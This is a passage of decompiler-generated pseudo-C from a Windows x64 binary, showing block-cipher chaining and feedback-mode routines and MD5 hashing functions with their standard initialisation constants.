  char v25; // dl
  char v26; // cl
  unsigned __int16 *v28; // [rsp+80h] [rbp+38h] BYREF
  va_list va; // [rsp+80h] [rbp+38h]
  int *v30; // [rsp+88h] [rbp+40h]
  __int64 v31; // [rsp+90h] [rbp+48h]
  va_list va1; // [rsp+98h] [rbp+50h] BYREF

  va_start(va1, a6);
  va_start(va, a6);
  v28 = va_arg(va1, unsigned __int16 *);
  v30 = va_arg(va1, int *);
  v31 = va_arg(va1, _QWORD);
  v6 = a3;
  v7 = v30;
  v8 = a2;
  v9 = a1;
  v10 = *v30;
  if ( (_DWORD)v31 )
  {
    if ( a3 )
    {
      v11 = v28;
      v12 = a1 - a2;
      do
      {
        --v6;
        if ( !v10 )
        {
          v13 = *((unsigned __int8 *)v11 + 4);
          v14 = *((unsigned __int8 *)v11 + 5);
          LODWORD(v28) = (*((unsigned __int8 *)v11 + 3) << 24) | (*((unsigned __int8 *)v11 + 2) << 16) | *v11;
          HIDWORD(v28) = (v14 << 8) | v13 | (v11[3] << 16);
          sub_1400858A0((unsigned int *)va, a4, a5, a6);
          v15 = WORD1(v28);
          *v11 = (unsigned __int16)v28;
          *((_BYTE *)v11 + 2) = v15;
          v16 = BYTE4(v28);
          *((_BYTE *)v11 + 3) = HIBYTE(v15);
          v17 = HIDWORD(v28);
          *((_BYTE *)v11 + 4) = v16;
          *((_BYTE *)v11 + 5) = BYTE1(v17);
          *((_BYTE *)v11 + 6) = BYTE2(v17);
          *((_BYTE *)v11 + 7) = HIBYTE(v17);
        }
        result = *((_BYTE *)v11 + v10) ^ v8[v12];
        *v8++ = result;
        *((_BYTE *)v11 + v10) = result;
        v10 = ((_BYTE)v10 + 1) & 7;
      }
      while ( v6 );
LABEL_13:
      v7 = v30;
    }
  }
  else if ( a3 )
  {
    v19 = v28;
    do
    {
      --v6;
      if ( !v10 )
      {
        v20 = *((unsigned __int8 *)v19 + 4);
        v21 = *((unsigned __int8 *)v19 + 5);
        LODWORD(v28) = (*((unsigned __int8 *)v19 + 3) << 24) | (*((unsigned __int8 *)v19 + 2) << 16) | *v19;
        HIDWORD(v28) = (v21 << 8) | v20 | (v19[3] << 16);
        sub_1400858A0((unsigned int *)va, a4, a5, a6);
        v22 = WORD1(v28);
        *v19 = (unsigned __int16)v28;
        *((_BYTE *)v19 + 2) = v22;
        v23 = BYTE4(v28);
        *((_BYTE *)v19 + 3) = HIBYTE(v22);
        v24 = HIDWORD(v28);
        *((_BYTE *)v19 + 4) = v23;
        *((_BYTE *)v19 + 5) = BYTE1(v24);
        *((_BYTE *)v19 + 6) = BYTE2(v24);
        *((_BYTE *)v19 + 7) = HIBYTE(v24);
      }
      v25 = *v9++;
      result = v10;
      v26 = *((_BYTE *)v19 + v10);
      *((_BYTE *)v19 + v10) = v25;
      *v8++ = v26 ^ v25;
      v10 = ((_BYTE)v10 + 1) & 7;
    }
    while ( v6 );
    goto LABEL_13;
  }
  *v7 = v10;
  return result;
}

//----- (0000000140087210) ----------------------------------------------------
unsigned __int8 *__fastcall sub_140087210(
        __int64 a1,
        __int64 a2,
        int a3,
        unsigned int a4,
        unsigned int *a5,
        unsigned int *a6,
        unsigned int *a7,
        unsigned __int8 *a8,
        int a9)
{
  unsigned int *v9; // r10
  unsigned int *v11; // r11
  unsigned int v13; // r12d
  unsigned __int8 *result; // rax
  int v17; // ecx
  __int64 v18; // r8
  int v19; // ebx
  int v20; // edi
  unsigned int v21; // ebx
  __int64 v22; // r14
  int v23; // r8d
  int v24; // edx
  int v25; // r8d
  int v26; // eax
  int v27; // eax
  int v28; // eax
  int v29; // edx
  int v30; // eax
  int v31; // eax
  int v32; // eax
  unsigned int v33; // edx
  int v34; // r8d
  __int64 v35; // rsi
  unsigned __int8 v36; // dl
  unsigned __int8 v37; // r9
  unsigned __int8 v38; // r10
  unsigned __int8 v39; // r8
  unsigned __int8 v40; // r11
  unsigned __int8 v41; // cl
  unsigned __int8 v42; // bl
  unsigned int v43; // r8d
  unsigned int v44; // r15d
  __int64 v45; // rdx
  unsigned int v46; // r12d
  __int64 v47; // r14
  int v48; // r12d
  int v49; // eax
  int v50; // eax
  int v51; // eax
  int v52; // r15d
  int v53; // eax
  int v54; // eax
  int v55; // eax
  unsigned __int8 v56; // dl
  unsigned __int8 v57; // r9
  unsigned __int8 v58; // r10
  unsigned __int8 v59; // r8
  unsigned __int8 v60; // r11
  unsigned __int8 v61; // cl
  unsigned __int8 v62; // bl
  int v63; // eax
  int v64; // edi
  int v65; // eax
  unsigned int v66; // r15d
  __int64 v67; // rsi
  int v68; // r12d
  unsigned __int8 v69; // [rsp+20h] [rbp-71h]
  unsigned __int8 v70; // [rsp+20h] [rbp-71h]
  int v71; // [rsp+24h] [rbp-6Dh]
  int v72; // [rsp+24h] [rbp-6Dh]
  int v73; // [rsp+28h] [rbp-69h]
  int v74; // [rsp+28h] [rbp-69h]
  int v75; // [rsp+2Ch] [rbp-65h]
  unsigned int v76; // [rsp+2Ch] [rbp-65h]
  int v77; // [rsp+30h] [rbp-61h] BYREF
  unsigned int v78; // [rsp+34h] [rbp-5Dh]
  int v79; // [rsp+38h] [rbp-59h]
  int v80; // [rsp+3Ch] [rbp-55h]
  unsigned int v81; // [rsp+40h] [rbp-51h]
  unsigned int v82; // [rsp+44h] [rbp-4Dh]
  unsigned int *v83; // [rsp+48h] [rbp-49h]
  unsigned int *v84; // [rsp+50h] [rbp-41h]
  unsigned int *v85; // [rsp+58h] [rbp-39h]
  unsigned __int8 *v86; // [rsp+60h] [rbp-31h]
  __int64 v87; // [rsp+68h] [rbp-29h]
  unsigned __int8 *v88; // [rsp+70h] [rbp-21h]
  int v89; // [rsp+78h] [rbp-19h] BYREF
  unsigned int v90; // [rsp+7Ch] [rbp-15h]
  unsigned int v91; // [rsp+80h] [rbp-11h]
  int v92; // [rsp+84h] [rbp-Dh]

  v9 = a5;
  v11 = a6;
  v13 = (unsigned int)(a3 + 7) >> 3;
  v83 = a7;
  result = a8;
  v88 = a8;
  v79 = a3;
  v84 = a5;
  v85 = a6;
  v82 = v13;
  if ( a3 <= 64 )
  {
    v17 = a8[7];
    v18 = (__int64)(a8 + 1);
    v19 = a8[4];
    v20 = (a8[3] << 24) | (a8[2] << 16) | (a8[1] << 8) | *a8;
    v86 = a8 + 1;
    v21 = ((a8[6] | (v17 << 8)) << 16) | (a8[5] << 8) | v19;
    if ( a9 )
    {
      if ( a4 >= v13 )
      {
        v75 = a3 / 8;
        v73 = a3 % 8;
        v71 = 8 - a3 % 8;
        do
        {
          v77 = v20;
          v78 = v21;
          a4 -= v13;
          sub_1400858A0((unsigned int *)&v77, v9, v11, v83);
          v22 = v13 + a1;
          v23 = 0;
          v24 = 0;
          switch ( v13 )
          {
            case 1u:
              goto LABEL_13;
            case 2u:
              goto LABEL_12;
            case 3u:
              goto LABEL_11;
            case 4u:
              goto LABEL_10;
            case 5u:
              goto LABEL_9;
            case 6u:
              goto LABEL_8;
            case 7u:
              goto LABEL_7;
            case 8u:
              v25 = *(unsigned __int8 *)--v22;
              v23 = v25 << 24;
LABEL_7:
              v26 = *(unsigned __int8 *)--v22;
              v23 |= v26 << 16;
LABEL_8:
              v27 = *(unsigned __int8 *)--v22;
              v23 |= v27 << 8;
LABEL_9:
              v28 = *(unsigned __int8 *)--v22;
              v23 |= v28;
LABEL_10:
              v29 = *(unsigned __int8 *)--v22;
              v24 = v29 << 24;
LABEL_11:
              v30 = *(unsigned __int8 *)--v22;
              v24 |= v30 << 16;
LABEL_12:
              v31 = *(unsigned __int8 *)--v22;
              v24 |= v31 << 8;
LABEL_13:
              v32 = *(unsigned __int8 *)--v22;
              v24 |= v32;
              break;
            default:
              break;
          }
          v33 = v77 ^ v24;
          a1 = v13 + v22;
          v34 = v78 ^ v23;
          v35 = v13 + a2;
          switch ( v13 )
          {
            case 1u:
              goto LABEL_22;
            case 2u:
              goto LABEL_21;
            case 3u:
              goto LABEL_20;
            case 4u:
              goto LABEL_19;
            case 5u:
              goto LABEL_18;
            case 6u:
              goto LABEL_17;
            case 7u:
              goto LABEL_16;
            case 8u:
              *(_BYTE *)--v35 = HIBYTE(v34);
LABEL_16:
              *(_BYTE *)--v35 = BYTE2(v34);
LABEL_17:
              *(_BYTE *)--v35 = BYTE1(v34);
LABEL_18:
              *(_BYTE *)--v35 = v34;
LABEL_19:
              *(_BYTE *)--v35 = HIBYTE(v33);
LABEL_20:
              *(_BYTE *)--v35 = BYTE2(v33);
LABEL_21:
              *(_BYTE *)--v35 = BYTE1(v33);
LABEL_22:
              *(_BYTE *)--v35 = v33;
              break;
            default:
              break;
          }
          a2 = v13 + v35;
          if ( v79 == 32 )
          {
            v20 = v21;
            v21 = v33;
          }
          else if ( v79 == 64 )
          {
            v20 = v33;
            v21 = v34;
          }
          else
          {
            v92 = v34;
            v89 = v20;
            v90 = v21;
            v91 = v33;
            memmove(&v89, (char *)&v89 + v75, (v73 != 0) + 8i64);
            v36 = BYTE1(v89);
            v37 = HIBYTE(v89);
            v38 = v90;
            if ( v73 )
            {
              v69 = (BYTE1(v89) >> v71) | ((_BYTE)v89 << v73);
              LOBYTE(v89) = v69;
              v36 = (BYTE2(v89) >> v71) | (BYTE1(v89) << v73);
              BYTE1(v89) = v36;
              v39 = (HIBYTE(v89) >> v71) | (BYTE2(v89) << v73);
              BYTE2(v89) = v39;
              v37 = ((unsigned __int8)v90 >> v71) | (HIBYTE(v89) << v73);
              HIBYTE(v89) = v37;
              v38 = (BYTE1(v90) >> v71) | ((_BYTE)v90 << v73);
              v40 = (BYTE2(v90) >> v71) | (BYTE1(v90) << v73);
              v41 = (HIBYTE(v90) >> v71) | (BYTE2(v90) << v73);
              BYTE2(v90) = v41;
              v42 = ((unsigned __int8)v91 >> v71) | (HIBYTE(v90) << v73);
              HIBYTE(v90) = v42;
              LOBYTE(v90) = v38;
              BYTE1(v90) = v40;
            }
            else
            {
              v42 = HIBYTE(v90);
              v41 = BYTE2(v90);
              v40 = BYTE1(v90);
              v39 = BYTE2(v89);
              v69 = v89;
            }
            v20 = v69 | ((v36 | ((v39 | (v37 << 8)) << 8)) << 8);
            v21 = v38 | ((v40 | ((v41 | (v42 << 8)) << 8)) << 8);
          }
          v9 = v84;
          v11 = v85;
        }
        while ( a4 >= v13 );
LABEL_62:
        v18 = (__int64)v86;
      }
    }
    else if ( a4 >= v13 )
    {
      v80 = a3 / 8;
      v74 = a3 % 8;
      v72 = 8 - a3 % 8;
      v76 = v13 - 1;
      v87 = v13;
      do
      {
        v77 = v20;
        v81 = a4 - v13;
        v78 = v21;
        sub_1400858A0((unsigned int *)&v77, v9, v11, v83);
        v43 = v76;
        v44 = 0;
        v45 = v13;
        v46 = 0;
        v47 = v45 + a1;
        switch ( v76 )
        {
          case 0u:
            goto LABEL_43;
          case 1u:
            goto LABEL_42;
          case 2u:
            goto LABEL_41;
          case 3u:
            goto LABEL_40;
          case 4u:
            goto LABEL_39;
          case 5u:
            goto LABEL_38;
          case 6u:
            goto LABEL_37;
          case 7u:
            v48 = *(unsigned __int8 *)--v47;
            v46 = v48 << 24;
LABEL_37:
            v49 = *(unsigned __int8 *)--v47;
            v46 |= v49 << 16;
LABEL_38:
            v50 = *(unsigned __int8 *)--v47;
            v46 |= v50 << 8;
LABEL_39:
            v51 = *(unsigned __int8 *)--v47;
            v46 |= v51;
LABEL_40:
            v52 = *(unsigned __int8 *)--v47;
            v44 = v52 << 24;
LABEL_41:
            v53 = *(unsigned __int8 *)--v47;
            v44 |= v53 << 16;
LABEL_42:
            v54 = *(unsigned __int8 *)--v47;
            v44 |= v54 << 8;
LABEL_43:
            v55 = *(unsigned __int8 *)--v47;
            v44 |= v55;
            break;
          default:
            break;
        }
        a1 = v45 + v47;
        if ( v79 == 32 )
        {
          v20 = v21;
          v21 = v44;
        }
        else if ( v79 == 64 )
        {
          v20 = v44;
          v21 = v46;
        }
        else
        {
          v89 = v20;
          v90 = v21;
          v91 = v44;
          v92 = v46;
          memmove(&v89, (char *)&v89 + v80, (v74 != 0) + 8i64);
          v56 = BYTE1(v89);
          v57 = HIBYTE(v89);
          v58 = v90;
          if ( v74 )
          {
            v70 = (BYTE1(v89) >> v72) | ((_BYTE)v89 << v74);
            LOBYTE(v89) = v70;
            v56 = (BYTE2(v89) >> v72) | (BYTE1(v89) << v74);
            BYTE1(v89) = v56;
            v59 = (HIBYTE(v89) >> v72) | (BYTE2(v89) << v74);
            BYTE2(v89) = v59;
            v57 = ((unsigned __int8)v90 >> v72) | (HIBYTE(v89) << v74);
            HIBYTE(v89) = v57;
            v58 = (BYTE1(v90) >> v72) | ((_BYTE)v90 << v74);
            v60 = (BYTE2(v90) >> v72) | (BYTE1(v90) << v74);
            v61 = (HIBYTE(v90) >> v72) | (BYTE2(v90) << v74);
            BYTE2(v90) = v61;
            v62 = ((unsigned __int8)v91 >> v72) | (HIBYTE(v90) << v74);
            HIBYTE(v90) = v62;
            LOBYTE(v90) = v58;
            BYTE1(v90) = v60;
          }
          else
          {
            v62 = HIBYTE(v90);
            v61 = BYTE2(v90);
            v60 = BYTE1(v90);
            v59 = BYTE2(v89);
            v70 = v89;
          }
          v63 = v59;
          v43 = v76;
          v64 = v63 | (v57 << 8);
          v65 = v56;
          v45 = v87;
          v20 = v70 | ((v65 | (v64 << 8)) << 8);
          v21 = v58 | ((v60 | ((v61 | (v62 << 8)) << 8)) << 8);
        }
        v66 = v77 ^ v44;
        v67 = v45 + a2;
        v68 = v78 ^ v46;
        switch ( v43 )
        {
          case 0u:
            goto LABEL_60;
          case 1u:
            goto LABEL_59;
          case 2u:
            goto LABEL_58;
          case 3u:
            goto LABEL_57;
          case 4u:
            goto LABEL_56;
          case 5u:
            goto LABEL_55;
          case 6u:
            goto LABEL_54;
          case 7u:
            *(_BYTE *)--v67 = HIBYTE(v68);
LABEL_54:
            *(_BYTE *)--v67 = BYTE2(v68);
LABEL_55:
            *(_BYTE *)--v67 = BYTE1(v68);
LABEL_56:
            *(_BYTE *)--v67 = v68;
LABEL_57:
            *(_BYTE *)--v67 = HIBYTE(v66);
LABEL_58:
            *(_BYTE *)--v67 = BYTE2(v66);
LABEL_59:
            *(_BYTE *)--v67 = BYTE1(v66);
LABEL_60:
            *(_BYTE *)--v67 = v66;
            break;
          default:
            break;
        }
        a4 = v81;
        a2 = v45 + v67;
        v13 = v82;
        v9 = v84;
        v11 = v85;
      }
      while ( v81 >= v82 );
      goto LABEL_62;
    }
    *v88 = v20;
    *(_BYTE *)v18 = BYTE1(v20);
    *(_BYTE *)(v18 + 1) = BYTE2(v20);
    *(_BYTE *)(v18 + 2) = HIBYTE(v20);
    *(_DWORD *)(v18 + 3) = v21;
    return (unsigned __int8 *)HIWORD(v21);
  }
  return result;
}

//----- (0000000140087AA0) ----------------------------------------------------
__int64 __fastcall sub_140087AA0(
        _BYTE *a1,
        __int64 a2,
        int a3,
        __int64 a4,
        unsigned int *a5,
        unsigned int *a6,
        unsigned __int8 *a7,
        int *a8)
{
  int *v9; // r13
  unsigned int *v11; // r10
  int v12; // r12d
  int v13; // ecx
  int v14; // ebx
  int v15; // r8d
  int v16; // r9d
  int v17; // r8d
  int v18; // r9d
  int v19; // ecx
  unsigned int v20; // r9d
  __int64 result; // rax
  unsigned int *v22; // r13
  __int64 v23; // r15
  unsigned int *v24; // rdi
  __int64 v25; // rdi
  int v26; // [rsp+20h] [rbp-50h] BYREF
  unsigned int v27; // [rsp+24h] [rbp-4Ch]
  unsigned int *v28; // [rsp+28h] [rbp-48h]
  unsigned int *v29; // [rsp+30h] [rbp-40h]
  unsigned int *v30; // [rsp+38h] [rbp-38h]
  unsigned __int8 *v31; // [rsp+40h] [rbp-30h]
  int *v32; // [rsp+48h] [rbp-28h]
  unsigned __int8 *v33; // [rsp+50h] [rbp-20h]
  unsigned int v34; // [rsp+58h] [rbp-18h]
  unsigned int v35; // [rsp+5Ch] [rbp-14h]

  v9 = a8;
  v11 = a6;
  v12 = 0;
  v29 = a5;
  v13 = a7[7];
  v14 = *a8;
  v33 = a7;
  v15 = *(unsigned __int16 *)a7;
  v28 = (unsigned int *)a4;
  v16 = a7[4];
  v17 = (a7[3] << 24) | (a7[2] << 16) | v15;
  v30 = a6;
  v18 = (a7[5] << 8) | v16;
  v32 = a8;
  v19 = a7[6] | (v13 << 8);
  v31 = a7 + 1;
  v20 = (v19 << 16) | v18;
  v34 = v17;
  v35 = v20;
  result = HIBYTE(v20);
  v26 = v17;
  v27 = v20;
  if ( a3 )
  {
    v22 = v28;
    v23 = a2 - (_QWORD)a1;
    v24 = v29;
    do
    {
      --a3;
      if ( !v14 )
      {
        sub_1400858A0((unsigned int *)&v26, v22, v24, v11);
        v17 = v26;
        v20 = v27;
        v11 = v30;
        v34 = v26;
        v35 = v27;
        ++v12;
      }
      result = v14;
      a1[v23] = *a1 ^ *((_BYTE *)&v34 + v14);
      ++a1;
      v14 = ((_BYTE)v14 + 1) & 7;
    }
    while ( a3 );
    v25 = (__int64)v31;
    v9 = v32;
    if ( v12 )
    {
      *v33 = v17;
      *(_BYTE *)v25 = BYTE1(v17);
      *(_BYTE *)(v25 + 1) = BYTE2(v17);
      *(_BYTE *)(v25 + 2) = HIBYTE(v17);
      *(_DWORD *)(v25 + 3) = v20;
      result = HIWORD(v20);
    }
  }
  *v9 = v14;
  return result;
}

//----- (0000000140087CB0) ----------------------------------------------------
_BYTE *__fastcall sub_140087CB0(unsigned int *a1, size_t a2, _BYTE *a3)
{
  _BYTE *v3; // rbx
  int v7[24]; // [rsp+20h] [rbp-88h] BYREF

  v3 = &unk_140143418;
  if ( a3 )
    v3 = a3;
  if ( !(unsigned int)sub_14005C560(v7) )
    return 0i64;
  sub_14005C5B0((__int64)v7, a1, a2);
  sub_14005C3D0(v3, v7);
  sub_140023440((__int64)v7, 96i64);
  return v3;
}
// 140087CB0: using guessed type int var_88[24];

//----- (0000000140087D50) ----------------------------------------------------
__int64 __fastcall sub_140087D50(
        unsigned __int16 *a1,
        __int64 a2,
        unsigned int a3,
        unsigned int *a4,
        _BYTE *a5,
        unsigned __int16 *a6,
        unsigned __int16 *a7,
        int a8)
{
  char *v10; // rdx
  int v11; // ecx
  int v13; // r11d
  int v14; // r12d
  int v15; // ecx
  char *v16; // rdx
  int v17; // r12d
  int v18; // ecx
  int v19; // r15d
  int v20; // r8d
  int v21; // r8d
  _BYTE *v22; // r14
  int v23; // esi
  _BYTE *v24; // rdi
  int v25; // r8d
  unsigned int v26; // r9d
  int v27; // edi
  unsigned __int64 v28; // r14
  int v29; // ecx
  int v30; // eax
  int v31; // r9d
  char *v32; // rbp
  int v33; // ecx
  int v34; // edx
  int v35; // ecx
  int v36; // eax
  int v37; // eax
  int v38; // eax
  int v39; // edx
  int v40; // eax
  int v41; // eax
  int v42; // r9d
  int v44; // r13d
  int v45; // r12d
  __int64 v46; // r14
  int v47; // ecx
  int v48; // r15d
  int v49; // r15d
  unsigned int v50; // r12d
  int v51; // r14d
  int v52; // edi
  int v53; // esi
  int v54; // edi
  int v55; // eax
  int v56; // edi
  int v57; // edx
  int v58; // esi
  int v59; // ecx
  int v60; // edi
  int v61; // esi
  int v62; // edx
  int v63; // r8d
  __int64 v64; // rbx
  int v65; // [rsp+20h] [rbp-58h]
  int v66; // [rsp+28h] [rbp-50h] BYREF
  int v67; // [rsp+2Ch] [rbp-4Ch]
  __int64 v68; // [rsp+30h] [rbp-48h]
  _BYTE *v69; // [rsp+38h] [rbp-40h]
  int v70; // [rsp+90h] [rbp+18h]
  unsigned int *v71; // [rsp+98h] [rbp+20h]
  int v72; // [rsp+A8h] [rbp+30h]
  int v73; // [rsp+B0h] [rbp+38h]

  v71 = a4;
  v10 = (char *)a6 + 1;
  v11 = *((unsigned __int8 *)a6 + 7) << 8;
  v13 = (*((unsigned __int8 *)a6 + 3) << 24) | (*((unsigned __int8 *)a6 + 2) << 16) | *a6;
  v14 = a6[2];
  v72 = v13;
  v15 = (unsigned __int8)v10[5] | v11;
  v16 = (char *)a7 + 1;
  v17 = (v15 << 16) | v14;
  v18 = *((unsigned __int8 *)a7 + 7) << 8;
  v65 = v17;
  v19 = (*((unsigned __int8 *)a7 + 3) << 24) | (*((unsigned __int8 *)a7 + 2) << 16) | *a7;
  v20 = a7[2];
  v73 = v19;
  v21 = (((unsigned __int8)v16[5] | v18) << 16) | v20;
  v70 = v21;
  if ( a8 )
  {
    v22 = a5;
    v23 = a3 - 8;
    v24 = a5 + 1;
    v25 = ((unsigned __int8)a5[3] << 24) | ((unsigned __int8)a5[2] << 16) | *(unsigned __int16 *)a5;
    v26 = (((unsigned __int8)a5[6] | ((unsigned __int8)a5[7] << 8)) << 16) | ((unsigned __int8)a5[5] << 8) | (unsigned __int8)a5[4];
    if ( (int)(a3 - 8) >= 0 )
    {
      v27 = v13;
      v28 = (unsigned __int64)a3 >> 3;
      do
      {
        v29 = (*((unsigned __int8 *)a1 + 6) << 16) | a1[2];
        v66 = v27 ^ v25 ^ ((*((unsigned __int8 *)a1 + 3) << 24) | (*((unsigned __int8 *)a1 + 2) << 16) | *a1);
        v30 = *((unsigned __int8 *)a1 + 7) << 24;
        a1 += 4;
        v67 = v17 ^ v26 ^ (v30 | v29);
        sub_140083220(&v66, v71, 1);
        v31 = v67;
        v25 = v19 ^ v66;
        *(_BYTE *)a2 = v19 ^ v66;
        v26 = v70 ^ v31;
        *(_BYTE *)(a2 + 1) = BYTE1(v25);
        *(_BYTE *)(a2 + 2) = BYTE2(v25);
        *(_BYTE *)(a2 + 3) = HIBYTE(v25);
        *(_DWORD *)(a2 + 4) = v26;
        a2 += 8i64;
        --v28;
      }
      while ( v28 );
      v24 = a5 + 1;
      v23 = a3 - 8 - 8 * (a3 >> 3);
      v13 = v72;
      v22 = a5;
    }
    if ( v23 != -8 )
    {
      v32 = (char *)a1 + v23 + 8;
      v33 = 0;
      v34 = 0;
      switch ( v23 )
      {
        case -7:
          goto LABEL_15;
        case -6:
          goto LABEL_14;
        case -5:
          goto LABEL_13;
        case -4:
          goto LABEL_12;
        case -3:
          goto LABEL_11;
        case -2:
          goto LABEL_10;
        case -1:
          goto LABEL_9;
        case 0:
          v35 = (unsigned __int8)*--v32;
          v33 = v35 << 24;
LABEL_9:
          v36 = (unsigned __int8)*--v32;
          v33 |= v36 << 16;
LABEL_10:
          v37 = (unsigned __int8)*--v32;
          v33 |= v37 << 8;
LABEL_11:
          v38 = (unsigned __int8)*--v32;
          v33 |= v38;
LABEL_12:
          v39 = (unsigned __int8)*--v32;
          v34 = v39 << 24;
LABEL_13:
          v40 = (unsigned __int8)*--v32;
          v34 |= v40 << 16;
LABEL_14:
          v41 = (unsigned __int8)*--v32;
          v34 |= v41 << 8;
LABEL_15:
          v34 |= (unsigned __int8)*(v32 - 1);
          break;
        default:
          break;
      }
      v66 = v13 ^ v25 ^ v34;
      v67 = v17 ^ v26 ^ v33;
      sub_140083220(&v66, v71, 1);
      v42 = v67;
      v25 = v19 ^ v66;
      *(_BYTE *)a2 = v19 ^ v66;
      v26 = v70 ^ v42;
      *(_BYTE *)(a2 + 1) = BYTE1(v25);
      *(_BYTE *)(a2 + 2) = BYTE2(v25);
      *(_BYTE *)(a2 + 3) = HIBYTE(v25);
      *(_DWORD *)(a2 + 4) = v26;
    }
    *v22 = v25;
    *v24 = BYTE1(v25);
    v24[1] = BYTE2(v25);
    v24[2] = HIBYTE(v25);
    *(_DWORD *)(v24 + 3) = v26;
    return HIWORD(v26);
  }
  else
  {
    v44 = a3 - 8;
    v45 = (unsigned __int8)a5[4];
    v46 = (__int64)(a5 + 1);
    v47 = (unsigned __int8)a5[7] << 8;
    v48 = *(unsigned __int16 *)a5;
    v69 = a5 + 1;
    v49 = ((unsigned __int8)a5[3] << 24) | ((unsigned __int8)a5[2] << 16) | v48;
    v50 = (((unsigned __int8)a5[6] | v47) << 16) | ((unsigned __int8)a5[5] << 8) | v45;
    if ( v44 > 0 )
    {
      v51 = v13;
      v68 = ((unsigned int)(v44 - 1) >> 3) + 1;
      do
      {
        v52 = *((unsigned __int8 *)a1 + 4);
        v53 = (*((unsigned __int8 *)a1 + 3) << 24) | (*((unsigned __int8 *)a1 + 2) << 16) | *a1;
        v66 = v73 ^ v53;
        v54 = (*((unsigned __int8 *)a1 + 6) << 16) | (*((unsigned __int8 *)a1 + 5) << 8) | v52;
        v55 = *((unsigned __int8 *)a1 + 7) << 24;
        a1 += 4;
        v56 = v55 | v54;
        v67 = v21 ^ v56;
        sub_140083220(&v66, a4, 0);
        v21 = v70;
        a4 = v71;
        v57 = v65 ^ v50 ^ v67;
        *(_DWORD *)a2 = v51 ^ v49 ^ v66;
        v49 = v53;
        v50 = v56;
        *(_DWORD *)(a2 + 4) = v57;
        a2 += 8i64;
        --v68;
      }
      while ( v68 );
      v46 = (__int64)v69;
      v44 -= 8 * (((unsigned int)(v44 - 1) >> 3) + 1);
    }
    if ( v44 != -8 )
    {
      v58 = *((unsigned __int8 *)a1 + 4);
      v59 = *((unsigned __int8 *)a1 + 7) << 8;
      v60 = (*((unsigned __int8 *)a1 + 3) << 24) | (*((unsigned __int8 *)a1 + 2) << 16) | *a1;
      v66 = v73 ^ v60;
      v61 = ((*((unsigned __int8 *)a1 + 6) | v59) << 16) | (*((unsigned __int8 *)a1 + 5) << 8) | v58;
      v67 = v21 ^ v61;
      sub_140083220(&v66, a4, 0);
      v62 = v72 ^ v49 ^ v66;
      v63 = v65 ^ v50 ^ v67;
      v64 = v44 + 8 + a2;
      switch ( v44 )
      {
        case -7:
          goto LABEL_31;
        case -6:
          goto LABEL_30;
        case -5:
          goto LABEL_29;
        case -4:
          goto LABEL_28;
        case -3:
          goto LABEL_27;
        case -2:
          goto LABEL_26;
        case -1:
          goto LABEL_25;
        case 0:
          *(_BYTE *)--v64 = HIBYTE(v63);
LABEL_25:
          *(_BYTE *)--v64 = BYTE2(v63);
LABEL_26:
          *(_BYTE *)--v64 = BYTE1(v63);
LABEL_27:
          *(_BYTE *)--v64 = v63;
LABEL_28:
          *(_BYTE *)--v64 = HIBYTE(v62);
LABEL_29:
          *(_BYTE *)--v64 = BYTE2(v62);
LABEL_30:
          *(_BYTE *)--v64 = BYTE1(v62);
LABEL_31:
          *(_BYTE *)(v64 - 1) = v62;
          break;
        default:
          break;
      }
      v49 = v60;
      v50 = v61;
    }
    *a5 = v49;
    *(_BYTE *)v46 = BYTE1(v49);
    *(_BYTE *)(v46 + 1) = BYTE2(v49);
    *(_BYTE *)(v46 + 2) = HIBYTE(v49);
    *(_DWORD *)(v46 + 3) = v50;
    return HIWORD(v50);
  }
}

//----- (0000000140088420) ----------------------------------------------------
__int64 __fastcall sub_140088420(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx
  unsigned __int8 *v3; // rdi
  unsigned __int64 v6; // rbx
  int v7; // ecx
  __int64 result; // rax

  v2 = *(unsigned int *)(a2 + 88);
  v3 = (unsigned __int8 *)(a2 + 24);
  *(_BYTE *)(v2 + a2 + 24) = 0x80;
  v6 = v2 + 1;
  if ( v6 > 0x38 )
  {
    memset(&v3[v6], 0, 64 - v6);
    v6 = 0i64;
    sub_140088710((int *)a2, v3, 1i64);
  }
  memset(&v3[v6], 0, 56 - v6);
  v3[56] = *(_BYTE *)(a2 + 16);
  v3[57] = *(_BYTE *)(a2 + 17);
  v3[58] = *(_BYTE *)(a2 + 18);
  v3[59] = *(_BYTE *)(a2 + 19);
  v3[60] = *(_BYTE *)(a2 + 20);
  v3[61] = *(_BYTE *)(a2 + 21);
  v3[62] = *(_BYTE *)(a2 + 22);
  v3[63] = *(_BYTE *)(a2 + 23);
  sub_140088710((int *)a2, v3, 1i64);
  *(_DWORD *)(a2 + 88) = 0;
  sub_140023440((__int64)v3, 64i64);
  v7 = *(_DWORD *)a2;
  *(_WORD *)a1 = *(_DWORD *)a2;
  *(_BYTE *)(a1 + 2) = BYTE2(v7);
  *(_BYTE *)(a1 + 3) = HIBYTE(v7);
  *(_DWORD *)(a1 + 4) = *(_DWORD *)(a2 + 4);
  *(_DWORD *)(a1 + 8) = *(_DWORD *)(a2 + 8);
  result = 1i64;
  *(_DWORD *)(a1 + 12) = *(_DWORD *)(a2 + 12);
  return result;
}

//----- (0000000140088590) ----------------------------------------------------
__int64 __fastcall sub_140088590(_DWORD *a1)
{
  int v1; // eax
  __int64 result; // rax

  memset(a1, 0, (unsigned int)(v1 + 60));
  result = 1i64;
  *a1 = 1732584193;
  a1[1] = -271733879;
  a1[2] = -1732584194;
  a1[3] = 271733878;
  return result;
}
// 1400885A1: variable 'v1' is possibly undefined

//----- (00000001400885E0) ----------------------------------------------------
__int64 __fastcall sub_1400885E0(__int64 a1, unsigned __int8 *a2, size_t a3)
{
  size_t v3; // rdi
  unsigned __int8 *v4; // rbp
  unsigned int v6; // eax
  unsigned int v7; // ecx
  __int64 v8; // rcx
  _QWORD *v9; // r14
  __int64 v10; // rbx
  size_t v11; // rbx

  v3 = a3;
  v4 = a2;
  if ( a3 )
  {
    v6 = *(_DWORD *)(a1 + 16);
    v7 = v6 + 8 * a3;
    if ( v7 < v6 )
      ++*(_DWORD *)(a1 + 20);
    *(_DWORD *)(a1 + 16) = v7;
    v8 = *(unsigned int *)(a1 + 88);
    *(_DWORD *)(a1 + 20) += a3 >> 29;
    if ( v8 )
    {
      v9 = (_QWORD *)(a1 + 24);
      if ( a3 < 0x40 && v8 + a3 < 0x40 )
      {
        memmove((char *)v9 + v8, a2, a3);
        *(_DWORD *)(a1 + 88) += v3;
        return 1i64;
      }
      v10 = 64 - v8;
      memmove((char *)v9 + v8, a2, 64 - v8);
      sub_140088710((int *)a1, (unsigned __int8 *)(a1 + 24), 1i64);
      *(_DWORD *)(a1 + 88) = 0;
      v4 += v10;
